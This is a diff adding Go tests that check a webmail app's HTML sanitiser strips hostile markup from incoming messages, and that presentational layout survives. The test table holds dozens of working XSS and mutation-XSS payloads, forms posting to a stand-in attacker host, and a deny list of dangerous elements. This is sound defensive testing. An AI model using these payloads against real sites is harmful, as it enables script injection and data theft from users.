@@ -19,6 +19,7 @@ import (
 	"github.com/ProtonMail/go-crypto/openpgp"
 	"github.com/emersion/go-imap/v2"
 	"github.com/emersion/go-mbox"
+	nethtml "golang.org/x/net/html"
 )
 
 func TestExportFailsAsAnError(t *testing.T) {
@@ -484,5 +485,203 @@ func TestUnbrokenLineShowsAsText(t *testing.T) {
 	page := a.SignIn(t, User).Page(t, "mail.message", "INBOX", uid, url.Values{"part": {"1"}})
 	if !strings.Contains(page, "LINESTART") || !strings.Contains(page, "LINEEND") {
 		t.Error("a 100 KiB line does not show as text")
+	}
+}
+
+// frameDoc is the document the message page puts in the mail frame.
+func frameDoc(t *testing.T, page string) string {
+	t.Helper()
+	doc := html.UnescapeString(Between(page, `srcdoc="`, `"`))
+	if !strings.Contains(doc, "MARK") {
+		t.Fatalf("the frame does not hold the message:\n%s", doc)
+	}
+	return doc
+}
+
+var (
+	refusedElements = []string{"script", "iframe", "frame", "object", "embed", "applet", "link", "meta", "base",
+		"form", "input", "button", "textarea", "select", "svg", "math"}
+	cssFetch = regexp.MustCompile(`(?i)url\(|expression\(|javascript:`)
+)
+
+// markupOf is each element and element@attribute=value in doc.
+func markupOf(doc string) map[string]bool {
+	kept := map[string]bool{}
+	z := nethtml.NewTokenizer(strings.NewReader(doc))
+	for tt := z.Next(); tt != nethtml.ErrorToken; tt = z.Next() {
+		if tt != nethtml.StartTagToken && tt != nethtml.SelfClosingTagToken {
+			continue
+		}
+		tok := z.Token()
+		kept[tok.Data] = true
+		for _, a := range tok.Attr {
+			kept[tok.Data+"@"+a.Key+"="+a.Val] = true
+		}
+	}
+	return kept
+}
+
+// unsafeMarkup is every way the frame document could run, fetch, or address what lies outside the
+// message; images may come only from under the paths own.
+func unsafeMarkup(doc string, own ...string) []string {
+	var found []string
+	z := nethtml.NewTokenizer(strings.NewReader(doc))
+	for {
+		tt := z.Next()
+		if tt == nethtml.ErrorToken {
+			return found
+		}
+		tok := z.Token()
+		if tt == nethtml.TextToken {
+			continue
+		}
+		if slices.Contains(refusedElements, tok.Data) {
+			found = append(found, "<"+tok.Data+">")
+		}
+		if tok.Data == "style" && tt == nethtml.StartTagToken && z.Next() == nethtml.TextToken {
+			if css := strings.ReplaceAll(string(z.Text()), "url(about:blank)", ""); cssFetch.MatchString(css) {
+				found = append(found, "style sheet "+css)
+			}
+		}
+		attrs := map[string]string{}
+		for _, a := range tok.Attr {
+			attrs[a.Key] = a.Val
+			switch {
+			case strings.HasPrefix(a.Key, "on"), a.Key == "srcdoc", a.Key == "formaction", a.Key == "action", strings.Contains(a.Key, ":"):
+				found = append(found, tok.Data+"@"+a.Key)
+			case a.Key == "src", a.Key == "background":
+				if !slices.ContainsFunc(own, func(p string) bool { return strings.HasPrefix(a.Val, p) }) {
+					found = append(found, tok.Data+"@"+a.Key+"="+a.Val)
+				}
+			case a.Key == "href", a.Key == "cite":
+				if u, err := url.Parse(a.Val); err != nil || !slices.Contains([]string{"http", "https", "mailto"}, u.Scheme) {
+					found = append(found, tok.Data+"@"+a.Key+"="+a.Val)
+				}
+			case a.Key == "style":
+				if css := strings.ReplaceAll(a.Val, "url(about:blank)", ""); cssFetch.MatchString(css) {
+					found = append(found, tok.Data+"@style="+a.Val)
+				}
+			}
+		}
+		if href, ok := attrs["href"]; ok && tok.Data == "a" {
+			rel := strings.Fields(attrs["rel"])
+			if !slices.Contains(rel, "nofollow") || !slices.Contains(rel, "noreferrer") {
+				found = append(found, "a without rel nofollow noreferrer: "+href)
+			}
+			if u, _ := url.Parse(href); u.Host != "" && (attrs["target"] != "_blank" || !slices.Contains(rel, "noopener")) {
+				found = append(found, "a to another host without target _blank and noopener: "+href)
+			}
+		}
+	}
+}
+
+// Every way an incoming message might run script, load on its own or reach outside itself is
+// refused, whatever the spelling (ADR 44).
+func TestHostileHTMLIsNeutralised(t *testing.T) {
+	cases := map[string]string{
+		"script":                   `<script>alert(1)</script>`,
+		"script upper case":        `<SCRIPT SRC=https://evil.example/x.js></SCRIPT>`,
+		"onerror":                  `<img src="https://evil.example/x.png" onerror="alert(1)">`,
+		"onload on body":           `<body onload="alert(1)"><p>x</p></body>`,
+		"onmouseover upper case":   `<div ONMOUSEOVER="alert(1)">x</div>`,
+		"javascript link":          `<a href="javascript:alert(1)">x</a>`,
+		"javascript mixed case":    `<a href="JaVaScRiPt:alert(1)">x</a>`,
+		"javascript entity":        `<a href="&#106;avascript:alert(1)">x</a>`,
+		"javascript hex entity":    `<a href="&#x6A;avascript&#x3A;alert(1)">x</a>`,
+		"javascript tab":           `<a href="java&#x09;script:alert(1)">x</a>`,
+		"javascript newline":       "<a href=\"java\nscript:alert(1)\">x</a>",
+		"javascript leading space": `<a href="  javascript:alert(1)">x</a>`,
+		"vbscript":                 `<a href="vbscript:msgbox(1)">x</a>`,
+		"data html link":           `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
+		"data svg image":           `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`,
+		"javascript image":         `<img src="javascript:alert(1)">`,
+		"relative link":            `<a href="/logout">x</a>`,
+		"protocol relative link":   `<a href="//evil.example/">x</a>`,
+		"fragment link":            `<a href="#top">x</a>`,
+		"target self":              `<a href="https://evil.example/" target="_self" rel="opener">x</a>`,
+		"cite javascript":          `<blockquote cite="javascript:alert(1)">x</blockquote>`,
+		"srcdoc":                   `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
+		"iframe":                   `<iframe src="https://evil.example/"></iframe>`,
+		"object":                   `<object data="https://evil.example/x.swf"></object>`,
+		"embed":                    `<embed src="https://evil.example/x.swf">`,
+		"applet":                   `<applet code="X.class" codebase="https://evil.example/"></applet>`,
+		"link":                     `<link rel="stylesheet" href="https://evil.example/x.css">`,
+		"meta refresh":             `<meta http-equiv="refresh" content="0;url=https://evil.example/">`,
+		"base":                     `<base href="https://evil.example/"><a href="x">x</a>`,
+		"form":                     `<form action="https://evil.example/"><input name="p"><button formaction="https://evil.example/">Go</button><textarea>t</textarea><select><option>o</option></select></form>`,
+		"style url":                `<div style="background:url(https://evil.example/t.png)">x</div>`,
+		"style url quoted":         `<div style="background-image:url('https://evil.example/t.png')">x</div>`,
+		"style expression":         `<div style="width:expression(alert(1))">x</div>`,
+		"sheet import url":         `<style>@import url(https://evil.example/x.css); p{color:red}</style>`,
+		"sheet import string":      `<style>@import 'https://evil.example/x.css';</style>`,
+		"sheet url":                `<style>p{background:url(https://evil.example/t.png)}</style>`,
+		"sheet breaks out":         `<style>p{color:"</style><img src=x onerror=alert(1)>"}</style>`,
+		"background javascript":    `<table background="javascript:alert(1)"><tr><td background="javascript:alert(1)">x</td></tr></table>`,
+		"background vbscript":      `<table><tr><td background="vbscript:msgbox(1)">x</td></tr></table>`,
+		"background remote":        `<table background="https://evil.example/t.png"><tr><td>x</td></tr></table>`,
+		"background relative":      `<table><tr><td background="/logout">x</td></tr></table>`,
+		"background protocol rel":  `<table><tr><td background="//evil.example/t.png">x</td></tr></table>`,
+		"background data":          `<table><tr><td background="data:image/png;base64,iVBORw0KGgo=">x</td></tr></table>`,
+		"svg script":               `<svg><script>alert(1)</script></svg>`,
+		"svg onload":               `<svg onload="alert(1)"><circle r="1"/></svg>`,
+		"svg xlink":                `<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
+		"math mxss":                `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>`,
+		"noscript mxss":            `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>`,
+	}
+	a := Alborz(t)
+	c := a.SignIn(t, User)
+	for name, markup := range cases {
+		t.Run(name, func(t *testing.T) {
+			uid := a.IMAP.Append(t, "INBOX", "From: <eve@example.org>\r\nTo: <"+User+">\r\nSubject: Hostile\r\nMIME-Version: 1.0\r\n"+
+				"Content-Type: text/html; charset=utf-8\r\n\r\n"+markup+"<p>MARK</p>\r\n")
+			for _, remote := range []string{"", "1"} {
+				page := c.Page(t, "mail.message", "INBOX", uid, url.Values{"part": {"1"}, "allow-remote-resources": {remote}})
+				own := []string{a.Path("mail.message.raw", "INBOX", uid) + "?", a.Path("mail.proxy") + "?"}
+				if found := unsafeMarkup(frameDoc(t, page), own...); len(found) > 0 {
+					t.Errorf("remote %q: the frame keeps %q", remote, found)
+				}
+			}
+		})
+	}
+}
+
+// Mail laid out with presentational HTML keeps it, and a background resolves as an image does:
+// to the message's own part, or through the proxy once remote images are allowed.
+func TestPresentationalHTMLKept(t *testing.T) {
+	const remote = "https://img.example.org/bg.png"
+	markup := `<center><font color="#336699" size="+1" face="Georgia, serif">Big</font> <big>b</big> <small>s</small></center>` +
+		`<p align="right">r</p><hr size="2" color="gray" width="80%" align="left" noshade>` +
+		`<table width="600" cellpadding="4" cellspacing="0" border="0" bgcolor="#ffffff" align="center" background="cid:bg">` +
+		`<tr><td valign="top" nowrap colspan="2" bgcolor="#eeeeee" width="50%" height="20" background="` + remote + `">MARK</td></tr></table>` +
+		`<img src="cid:bg" border="0" width="10" alt="logo">`
+	want := []string{"center", "big", "small", "font@color=#336699", "font@size=+1", "font@face=Georgia, serif", "p@align=right",
+		"hr@size=2", "hr@color=gray", "hr@width=80%", "hr@align=left", "hr@noshade=",
+		"table@width=600", "table@cellpadding=4", "table@cellspacing=0", "table@border=0", "table@bgcolor=#ffffff", "table@align=center",
+		"td@valign=top", "td@nowrap=", "td@colspan=2", "td@bgcolor=#eeeeee", "td@width=50%", "td@height=20",
+		"img@border=0", "img@width=10", "img@alt=logo"}
+
+	a := Alborz(t)
+	uid := a.IMAP.Append(t, "INBOX", "From: <eve@example.org>\r\nTo: <"+User+">\r\nSubject: Layout\r\nMIME-Version: 1.0\r\n"+
+		"Content-Type: multipart/related; boundary=r\r\n\r\n"+
+		"--r\r\nContent-Type: text/html; charset=utf-8\r\n\r\n"+markup+"\r\n"+
+		"--r\r\nContent-Type: image/png\r\nContent-ID: <bg>\r\n\r\nPNG\r\n--r--\r\n")
+	c := a.SignIn(t, User)
+	part := a.Path("mail.message.raw", "INBOX", uid, url.Values{"part": {"2"}})
+	proxied := `background="` + a.Path("mail.proxy") + `?src=`
+
+	doc := frameDoc(t, c.Page(t, "mail.message", "INBOX", uid, url.Values{"part": {"1"}}))
+	kept := markupOf(doc)
+	for _, w := range append(want, "table@background="+part, "img@src="+part) {
+		if !kept[w] {
+			t.Errorf("the frame lost %s:\n%s", w, doc)
+		}
+	}
+	if strings.Contains(doc, proxied) || strings.Contains(doc, remote) {
+		t.Errorf("a remote background loads before remote images are allowed:\n%s", doc)
+	}
+
+	doc = frameDoc(t, c.Page(t, "mail.message", "INBOX", uid, url.Values{"part": {"1"}, "allow-remote-resources": {"1"}}))
+	if !strings.Contains(doc, proxied) {
+		t.Errorf("an allowed remote background does not go through the proxy:\n%s", doc)
 	}
 }
